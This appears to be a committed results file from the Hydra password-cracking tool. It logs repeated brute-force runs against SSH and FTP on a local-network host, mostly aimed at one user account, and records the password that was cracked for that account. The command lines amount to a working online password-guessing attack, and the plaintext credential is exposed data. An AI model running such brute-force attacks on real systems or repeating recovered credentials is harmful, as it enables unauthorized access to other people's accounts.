@@ -1,0 +1,18 @@
+# Hydra v8.1 run at 2018-10-09 11:50:16 on 192.168.0.115 ssh (/hydra_api/hydra -L .\users.txt -P .\passwords.txt -o results.txt -f 192.168.0.115 ssh)
+# Hydra v8.1 run at 2018-10-09 12:12:50 on 192.168.0.115 ssh (/hydra_api/hydra -R)
+# Hydra v8.1 run at 2018-10-09 12:14:50 on 192.168.0.115 ssh (/hydra_api/hydra -l benjamin -P .\passwords.txt -o results.txt -f -t 64 192.168.0.115 ssh)
+# Hydra v8.1 run at 2018-10-09 12:15:06 on 192.168.0.115 ssh (/hydra_api/hydra -l benjamin -P .\passwords.txt -o results.txt -f -t 64 192.168.0.115 ssh)
+# Hydra v8.1 run at 2018-10-09 12:15:11 on 192.168.0.115 ssh (/hydra_api/hydra -l benjamin -P .\passwords.txt -o results.txt -f -t 20 192.168.0.115 ssh)
+[22][ssh] host: 192.168.0.115   login: benjamin   password: 1357924680
+# Hydra v8.1 run at 2018-10-09 12:19:07 on 192.168.0.115 ftp (/hydra_api/hydra -l benjamin -P .\passwords.txt -o results.txt -f -t 20 192.168.0.115 ftp)
+# Hydra v8.1 run at 2018-10-09 12:24:01 on 192.168.0.115 ftp (/hydra_api/hydra -l benjamin -P .\passwords.txt -o results.txt -f -t 20 -w 2 192.168.0.115 ftp)
+# Hydra v8.1 run at 2018-10-09 12:24:26 on 192.168.0.115 ssh (/hydra_api/hydra -l benjamin -P .\passwords.txt -o results.txt -f -t 20 -w 2 192.168.0.115 ssh)
+# Hydra v8.1 run at 2018-10-09 12:25:15 on 192.168.0.115 ssh (/hydra_api/hydra -l benjamin -P .\passwords.txt -o results.txt -f -t 20 -w 2 -vV 192.168.0.115 ssh)
+# Hydra v8.1 run at 2018-10-09 12:26:06 on 192.168.0.115 ssh (/hydra_api/hydra -l benjamin -P .\passwords.txt -o results.txt -f -t 20 -w 2 -vV -q -t 64 192.168.0.115 ssh)
+# Hydra v8.1 run at 2018-10-09 12:26:40 on 192.168.0.115 ssh (/hydra_api/hydra -l benjamin -P .\passwords.txt -o results.txt -f -t 20 -w 2 -vV -q -t 64 192.168.0.115 ssh)
+# Hydra v8.1 run at 2018-10-09 12:27:08 on 192.168.0.115 ssh (/hydra_api/hydra -l benjamin -P .\passwords.txt -o results.txt -f -t 20 -w 2 -vV -q -t 32 192.168.0.115 ssh)
+# Hydra v8.1 run at 2018-10-09 12:27:17 on 192.168.0.115 ssh (/hydra_api/hydra -l benjamin -P .\passwords.txt -o results.txt -f -t 20 -w 2 -vV -q -t 32 192.168.0.115 ssh)
+# Hydra v8.1 run at 2018-10-09 12:27:36 on 192.168.0.115 ssh (/hydra_api/hydra -l benjamin -P .\passwords.txt -o results.txt -f -t 20 -w 2 -vV -q -t 4 192.168.0.115 ssh)
+# Hydra v8.1 run at 2018-10-09 12:29:55 on 192.168.0.115 ssh (/hydra_api/hydra -l benjamin -P .\passwords.txt -o results.txt -f -t 20 192.168.0.115 ssh)
+[22][ssh] host: 192.168.0.115   login: benjamin   password: 1357924680
+[22][ssh] host: 192.168.0.115   login: benjamin   password: 1357924680
